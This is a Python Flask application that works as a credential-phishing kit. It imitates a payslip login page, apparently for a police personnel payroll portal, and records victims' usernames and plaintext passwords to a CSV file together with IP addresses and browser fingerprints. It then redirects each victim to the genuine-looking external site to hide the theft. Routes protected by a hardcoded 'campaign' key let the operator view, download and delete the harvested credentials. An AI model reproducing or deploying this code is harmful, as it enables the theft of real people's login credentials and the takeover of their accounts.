from flask import Flask, render_template, request, redirect, jsonify, session, send_file
import csv # getting the configuration of csv
import os # configuration/ portable way of using operating system
import time #getting the time
import subprocess #allows you to spawn new processes, connect to their input/output/error pipes, and obtain their return codes.
import platform 
import re 
import json 
import hashlib
import uuid
from datetime import datetime

app = Flask(__name__)
app.secret_key = os.urandom(24)  # Required for session

# Add a custom filter for hashing passwords in templates
@app.template_filter('hash')
def hash_filter(value):
    """Hash a value for display in templates"""
    if not value:
        return "N/A"
    # Create a SHA-256 hash with some salt
    hashed = hashlib.sha256(f"pnppms-{value}".encode()).hexdigest()
    # Return the full hash
    return hashed

# Secret access key for stats page (change this to a secure value)
STATS_ACCESS_KEY = "pnp-pms-campaign2025"

# Route for rendering the identity page as the main landing page
@app.route('/Account/Login?ReturnUrl=%2F')
def index():
    return render_template('index.html')

# Route for handling login form submission
@app.route('/login', methods=['POST'])
def login():
    # Get the form data
    username = request.form.get('username')
    password = request.form.get('password')
    
    if not username or not password:
        return render_template('index.html', error="Please enter both username and password")
    
    # Get client information
    ip_address = get_client_ip()
    device_type = get_device_type()
    device_fingerprint = generate_device_fingerprint()
    browser_info = get_browser_info()
    
    # Save the complete data
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    firstname = "" # No longer collecting this separately
    lastname = "" # No longer collecting this separately
    
    save_full_data(firstname, lastname, username, password, timestamp, ip_address, device_fingerprint, device_type, browser_info)
    
    # Redirect to external site
    return redirect("https://payslip.pnppms.org/Account/Login?ReturnUrl=%2f")

"""
A function designed to retrieve 
and return the client's actual IP address.
"""
def get_client_ip():
    """
    Enhanced function to get the most accurate client IP address
    by checking multiple headers in priority order
    """
    # List of headers to check in priority order
    ip_headers = [
        'CF-Connecting-IP',           # Cloudflare
        'True-Client-IP',             # Akamai and some CDNs
        'X-Forwarded-For',            # Most common proxy header
        'X-Real-IP',                  # Nginx proxy/FastCGI
        'X-Client-IP',                # Apache proxy
        'Forwarded',                  # RFC 7239 standard
        'X-Forwarded',                # Non-standard but sometimes used
        'X-Cluster-Client-IP',        # Used by some load balancers
        'Fastly-Client-IP',           # Fastly CDN
        'X-Originating-IP'            # Microsoft 
    ]
    
    # Check each header in order
    for header in ip_headers:
        if header.lower() == 'x-forwarded-for' and request.headers.getlist(header):
            # X-Forwarded-For may contain multiple IPs, get the first one (client)
            forwarded_for = request.headers.getlist(header)[0]
            if forwarded_for:
                # Get the leftmost IP which is typically the original client
                client_ip = forwarded_for.split(',')[0].strip()
                if client_ip and client_ip != '127.0.0.1' and client_ip != 'unknown':
                    return client_ip
        elif request.headers.get(header):
            client_ip = request.headers.get(header).strip()
            if client_ip and client_ip != '127.0.0.1' and client_ip != 'unknown':
                return client_ip
    
    # Try WSGI environment variables if headers failed
    if request.environ.get('HTTP_X_FORWARDED_FOR'):
        forwarded_for = request.environ.get('HTTP_X_FORWARDED_FOR')
        client_ip = forwarded_for.split(',')[0].strip()
        if client_ip and client_ip != '127.0.0.1':
            return client_ip
    
    return request.remote_addr

"""
Function to determine if the client is using a mobile or desktop device
depending on their current device they try to log in.
"""
def get_device_type():
    user_agent = request.headers.get('User-Agent', '').lower()
    
    # Patterns specifically for phones
    phone_patterns = [
        'android', 'iphone', 'ipod', 'blackberry', 
        'iemobile', 'opera mini', 'windows phone', 'mobile'
    ]
    
    # Patterns for tablets (which are still mobile but not phones)
    tablet_patterns = [
        'ipad', 'tablet'
    ]
    
    # First check if it's a phone
    if any(pattern in user_agent for pattern in phone_patterns):
        return 'Phone'
    # If not a phone, check if it's a tablet
    elif any(pattern in user_agent for pattern in tablet_patterns):
        return 'Tablet'
    # Otherwise it's a desktop
    return 'Desktop'

def generate_device_fingerprint():
    """
    Generate a unique device fingerprint based on browser characteristics
    This is more reliable than trying to get MAC addresses
    """
    user_agent = request.headers.get('User-Agent', '')
    accept_lang = request.headers.get('Accept-Language', '')
    accept_encoding = request.headers.get('Accept-Encoding', '')
    accept = request.headers.get('Accept', '')
    ip_address = get_client_ip()
    screen_info = request.cookies.get('screen_info', '')
    timezone = request.cookies.get('timezone', '')
    platform_info = request.cookies.get('platform_info', '')
    canvas_fp = request.cookies.get('canvas_fp', '')
    
    # Create a unique fingerprint from multiple browser characteristics
    fingerprint_data = f"{user_agent}|{accept_lang}|{accept_encoding}|{accept}|{ip_address}|{screen_info}|{timezone}|{platform_info}|{canvas_fp}"
    # Generate a unique ID combining SHA-256 hash and a portion of UUID
    unique_id = str(uuid.uuid4())[:8]
    fingerprint = hashlib.sha256(fingerprint_data.encode()).hexdigest()[:24] + unique_id
    
    return fingerprint

def get_browser_info():
    """
    Extract comprehensive browser information from User-Agent
    """
    user_agent = request.headers.get('User-Agent', '')
    
    # Extract browser name and version
    browser_name = "Unknown"
    browser_version = "Unknown"
    
    # Samsung Internet browser
    if re.search(r'SamsungBrowser/(\d+(\.\d+)+)', user_agent):
        browser_name = "Samsung Internet"
        match = re.search(r'SamsungBrowser/(\d+(\.\d+)+)', user_agent)
        if match:
            browser_version = match.group(1)
    # UC Browser
    elif re.search(r'UCBrowser/(\d+(\.\d+)+)', user_agent):
        browser_name = "UC Browser"
        match = re.search(r'UCBrowser/(\d+(\.\d+)+)', user_agent)
        if match:
            browser_version = match.group(1)
    # Yandex Browser
    elif re.search(r'YaBrowser/(\d+(\.\d+)+)', user_agent):
        browser_name = "Yandex"
        match = re.search(r'YaBrowser/(\d+(\.\d+)+)', user_agent)
        if match:
            browser_version = match.group(1)
    # Edge
    elif re.search(r'Edg/|Edge/', user_agent):
        browser_name = "Edge"
        match = re.search(r'(?:Edge|Edg)/(\d+(\.\d+)+)', user_agent)
        if match:
            browser_version = match.group(1)
    # Firefox Focus/Klar 
    elif re.search(r'Focus/|Klar/', user_agent) and re.search(r'Firefox/', user_agent):
        browser_name = "Firefox Focus"
        match = re.search(r'(?:Focus|Klar)/(\d+(\.\d+)+)', user_agent)
        if match:
            browser_version = match.group(1)
    # Firefox
    elif re.search(r'Firefox/', user_agent):
        browser_name = "Firefox"
        match = re.search(r'Firefox/(\d+(\.\d+)+)', user_agent)
        if match:
            browser_version = match.group(1)
    # Opera
    elif re.search(r'OPR/|Opera/', user_agent):
        browser_name = "Opera"
        match = re.search(r'(?:OPR|Opera)/(\d+(\.\d+)+)', user_agent)
        if match:
            browser_version = match.group(1)
    # Vivaldi
    elif re.search(r'Vivaldi/', user_agent):
        browser_name = "Vivaldi"
        match = re.search(r'Vivaldi/(\d+(\.\d+)+)', user_agent)
        if match:
            browser_version = match.group(1)
    # Chromium
    elif re.search(r'Chromium/', user_agent):
        browser_name = "Chromium"
        match = re.search(r'Chromium/(\d+(\.\d+)+)', user_agent)
        if match:
            browser_version = match.group(1)
    # Chrome
    elif re.search(r'Chrome/', user_agent) and not re.search(r'Chromium|Edg|Edge|OPR|Opera|YaBrowser|SamsungBrowser|UCBrowser|Vivaldi/', user_agent):
        browser_name = "Chrome"
        match = re.search(r'Chrome/(\d+(\.\d+)+)', user_agent)
        if match:
            browser_version = match.group(1)
    # Safari on iOS
    elif re.search(r'Safari/', user_agent) and re.search(r'iPhone|iPad|iPod', user_agent) and not re.search(r'Chrome|Chromium|Edge|Edg|OPR|Opera/', user_agent):
        browser_name = "Safari (iOS)"
        match = re.search(r'Version/(\d+(\.\d+)+)', user_agent)
        if match:
            browser_version = match.group(1)
    # Safari on macOS
    elif re.search(r'Safari/', user_agent) and not re.search(r'Chrome|Chromium|Edge|Edg|OPR|Opera/', user_agent):
        browser_name = "Safari"
        match = re.search(r'Version/(\d+(\.\d+)+)', user_agent)
        if match:
            browser_version = match.group(1)
    # Internet Explorer
    elif re.search(r'MSIE|Trident/', user_agent):
        browser_name = "Internet Explorer"
        msie_match = re.search(r'MSIE\s+(\d+(\.\d+)+)', user_agent)
        rv_match = re.search(r'rv:(\d+(\.\d+)+)', user_agent)
        
        if msie_match:
            browser_version = msie_match.group(1)
        elif rv_match:
            browser_version = rv_match.group(1)
    
    # Create browser info JSON with browser details
    browser_details = {
        'browser_name': browser_name,
        'browser_version': browser_version,
        'full_user_agent': user_agent
    }
    
    return json.dumps(browser_details)

def save_full_data(firstname, lastname, username, password, timestamp, ip_address, device_fingerprint, device_type, browser_info):
    """ 
    Save simplified user data to CSV with only essential information
    """
    script_dir = os.path.dirname(os.path.abspath(__file__))
    csv_path = os.path.join(script_dir, 'data.csv')
    
    try:
        file_exists = os.path.isfile(csv_path)
        
        with open(csv_path, 'a', newline='\n') as csvfile:
            writer = csv.writer(csvfile, delimiter=',', quoting=csv.QUOTE_MINIMAL)

            # Write header if file does not exist or is empty
            if not file_exists or os.stat(csv_path).st_size == 0:
                writer.writerow([
                    'first_name',
                    'last_name',
                    'username',
                    'password',
                    'timestamp'
                ])
                csvfile.flush()

            # Write only essential data
            writer.writerow([
                firstname,
                lastname,
                username,
                password,
                timestamp
            ])
            csvfile.flush()
            
        # Update the last modified timestamp
        update_last_modified_timestamp()
            
    except Exception as e:
        # Fallback path if main path fails
        fallback_path = os.path.join(os.path.expanduser('~'), 'data.csv')
        with open(fallback_path, 'a', newline='\n') as csvfile:
            writer = csv.writer(csvfile, delimiter=',', quoting=csv.QUOTE_MINIMAL)
            
            if not os.path.exists(fallback_path) or os.stat(fallback_path).st_size == 0:
                writer.writerow([
                    'first_name',
                    'last_name',
                    'username',
                    'password',
                    'timestamp'
                ])
                csvfile.flush()
            
            # Write only essential data
            writer.writerow([
                firstname,
                lastname,
                username,
                password,
                timestamp
            ])
            csvfile.flush()
            
        # Update the last modified timestamp (for fallback path)
        update_last_modified_timestamp(fallback_path)

def update_last_modified_timestamp(csv_path=None):
    """Update the timestamp for when the data was last modified"""
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        timestamp_file = os.path.join(script_dir, 'last_modified.txt')
        
        # Get current timestamp
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # Write timestamp to file
        with open(timestamp_file, 'w') as f:
            f.write(current_time)
    except Exception as e:
        print(f"Error updating timestamp: {str(e)}")

def get_last_modified_timestamp():
    """Get the timestamp when the data was last modified"""
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        timestamp_file = os.path.join(script_dir, 'last_modified.txt')
        
        if os.path.exists(timestamp_file):
            with open(timestamp_file, 'r') as f:
                return f.read().strip()
        
        # If file doesn't exist, check the CSV file's modification time
        csv_path = os.path.join(script_dir, 'data.csv')
        if os.path.exists(csv_path):
            modified_time = os.path.getmtime(csv_path)
            return datetime.fromtimestamp(modified_time).strftime('%Y-%m-%d %H:%M:%S')
        
        return datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    except Exception as e:
        print(f"Error getting timestamp: {str(e)}")
        return datetime.now().strftime('%Y-%m-%d %H:%M:%S')

# Add a route to view statistics with access key protection
@app.route('/stats/<access_key>', methods=['GET'])
def view_stats(access_key):
    if access_key != STATS_ACCESS_KEY:
        return "Access denied", 403
    
    # Try to find the data file in various locations
    possible_paths = [
        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data.csv'),
        os.path.join('/tmp', 'data.csv'),
        os.path.join(os.path.expanduser('~'), 'data.csv')
    ]
    
    data = []
    for path in possible_paths:
        if os.path.exists(path):
            try:
                with open(path, 'r') as csvfile:
                    reader = csv.DictReader(csvfile)
                    # Filter to only include username, password, and timestamp
                    data = [{
                        'username': row.get('username', ''),
                        'password': row.get('password', ''),
                        'timestamp': row.get('timestamp', '')
                    } for row in reader]
                break  # Successfully read data, exit loop
            except Exception as e:
                continue
    
    # Get the last modified timestamp
    last_updated = get_last_modified_timestamp()
    
    if request.args.get('format') == 'json':
        return json.dumps(data)
    else:
        return render_template('stats.html', entries=data, access_key=access_key, last_updated=last_updated)

# Add a route to download the CSV data
@app.route('/download-csv/<access_key>', methods=['GET'])
def download_csv(access_key):
    if access_key != STATS_ACCESS_KEY:
        return "Access denied", 403
    
    # Try to find the data file in various locations
    possible_paths = [
        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data.csv'),
        os.path.join('/tmp', 'data.csv'),
        os.path.join(os.path.expanduser('~'), 'data.csv')
    ]
    
    csv_path = None
    for path in possible_paths:
        if os.path.exists(path):
            csv_path = path
            break
    
    if not csv_path:
        return "No data available", 404
    
    # Create a temporary file for download with plain text passwords
    temp_csv_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'temp_download.csv')
    
    try:
        # Read the original data
        with open(csv_path, 'r') as csvfile:
            reader = csv.reader(csvfile)
            all_data = list(reader)
        
        # Create new file with only the required fields
        with open(temp_csv_path, 'w', newline='\n') as csvfile:
            writer = csv.writer(csvfile)
            
            # Write the header with only the required fields
            writer.writerow(['username', 'password', 'timestamp'])
            
            # Write data with only the required fields (keep password as plain text)
            for row in all_data[1:]:
                if len(row) >= 5:  # Make sure the row has enough columns
                    # Extract only username, password, timestamp (index 2, 3, 4)
                    username = row[2]
                    password = row[3]  # Plain text password
                    timestamp = row[4]
                    
                    # Write only the required fields with plain text password
                    writer.writerow([username, password, timestamp])
        
        # Set the appropriate headers for CSV download
        filename = f"login_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        
        # Send the temporary file
        response = send_file(
            temp_csv_path,
            mimetype='text/csv',
            as_attachment=True,
            download_name=filename
        )
        
        # Clean up temp file after response is sent
        @response.call_on_close
        def cleanup():
            if os.path.exists(temp_csv_path):
                try:
                    os.remove(temp_csv_path)
                except:
                    pass
        
        return response
        
    except Exception as e:
        print(f"Error generating download file: {str(e)}")
        if os.path.exists(temp_csv_path):
            try:
                os.remove(temp_csv_path)
            except:
                pass
        return f"Error: {str(e)}", 500

# Add a route to delete a specific entry
@app.route('/delete-entry/<access_key>/<int:entry_index>', methods=['DELETE'])
def delete_entry(access_key, entry_index):
    if access_key != STATS_ACCESS_KEY:
        return "Access denied", 403
    
    # Try to find the data file in various locations
    possible_paths = [
        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data.csv'),
        os.path.join('/tmp', 'data.csv'),
        os.path.join(os.path.expanduser('~'), 'data.csv')
    ]
    
    csv_path = None
    for path in possible_paths:
        if os.path.exists(path):
            csv_path = path
            break
    
    if not csv_path:
        return "No data available", 404
    
    try:
        # Read all data
        all_data = []
        with open(csv_path, 'r') as csvfile:
            reader = csv.reader(csvfile)
            all_data = list(reader)
        
        # Check if the index is valid
        if entry_index < 0 or entry_index >= len(all_data) - 1:  # -1 for header
            return "Invalid entry index", 400
        
        # Remove the entry (add 1 to skip header)
        del all_data[entry_index + 1]
        
        # Write back the updated data
        with open(csv_path, 'w', newline='\n') as csvfile:
            writer = csv.writer(csvfile)
            writer.writerows(all_data)
        
        # Update the last modified timestamp
        update_last_modified_timestamp()
        
        return "Entry deleted successfully", 200
    
    except Exception as e:
        print(f"Error deleting entry: {str(e)}")
        return f"Error: {str(e)}", 500

# Add a route to delete all entries
@app.route('/delete-all/<access_key>', methods=['DELETE'])
def delete_all(access_key):
    if access_key != STATS_ACCESS_KEY:
        return "Access denied", 403
    
    # Try to find the data file in various locations
    possible_paths = [
        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data.csv'),
        os.path.join('/tmp', 'data.csv'),
        os.path.join(os.path.expanduser('~'), 'data.csv')
    ]
    
    csv_path = None
    for path in possible_paths:
        if os.path.exists(path):
            csv_path = path
            break
    
    if not csv_path:
        return "No data available", 404
    
    try:
        # Keep only the header row
        with open(csv_path, 'r') as csvfile:
            reader = csv.reader(csvfile)
            header = next(reader)  # Get header row
        
        # Write back only the header
        with open(csv_path, 'w', newline='\n') as csvfile:
            writer = csv.writer(csvfile)
            writer.writerow(header)
        
        # Update the last modified timestamp
        update_last_modified_timestamp()
        
        return "All entries deleted successfully", 200
    
    except Exception as e:
        print(f"Error deleting all entries: {str(e)}")
        return f"Error: {str(e)}", 500

if __name__ == '__main__':
    #run server 
    app.run(
        host='0.0.0.0',  
        port=5000,       # You can change this port if needed. do not remove for handling port.
        debug=False      # set to False for production. do not remove this.
    ) 